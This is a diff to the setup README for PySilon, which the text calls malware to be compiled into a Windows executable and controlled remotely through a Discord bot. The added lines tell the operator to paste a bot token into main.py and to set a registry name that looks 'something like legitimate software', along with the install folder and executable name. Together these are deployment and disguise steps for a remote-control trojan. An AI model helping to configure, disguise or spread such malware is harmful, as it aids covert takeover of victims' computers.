@@ -27,7 +27,7 @@ pip install -r requirements.txt
 # Setup
 This process consists of 3 stages:
 > 1. Prepare Discord server and Discord BOT<br />
-> 2. Setup required values in source code<br />
+> 2. Set up required values in source code<br />
 > 3. Compile malware to Windows executable<br />
 ### Prepare Discord server and Discord BOT
 > First of all, you need Discord server as environment for remote controlling PySilon. In order to do that, create new one:
@@ -73,7 +73,36 @@ This process consists of 3 stages:
 
 > As you can see, BOT is now in the server:
 
-<img src="https://user-images.githubusercontent.com/44233157/203319836-e7aeb93f-3c22-491b-aea2-cd2aaa41d65d.png" />
+<img src="https://user-images.githubusercontent.com/44233157/203319836-e7aeb93f-3c22-491b-aea2-cd2aaa41d65d.png" /><br />
+
+### Set up required values in source code
+
+> To make it possible, you need to enable "Developer mode" in Discord settings
+
+<img src="https://user-images.githubusercontent.com/44233157/203321226-e01e4c39-678b-4f77-9bee-1607ad43c1d0.jpg" />
+
+> Now, open "main.py" in any text editor and paste BOT-Token coped earlier in 47th line:
+
+```python
+bot_token = ''   # Paste here BOT-token
+```
+
+> Now, set program name in 48th line that will be shown in registry:   (something like legitimate software)
+```python
+software_registry_name = 'PySilon'   # Software name shown in registry
+```
+
+> You can also change directory name (49th line) that will be created in `C:/Users/{username}/` and executable name (50th line):
+```python
+software_directory_name = software_registry_name
+software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # MUST end with '.exe'
+# As you can see, theese variables are set based on registry name by default. However you can just change it to string if you want
+```
+
+
+
+
+
 
 
 
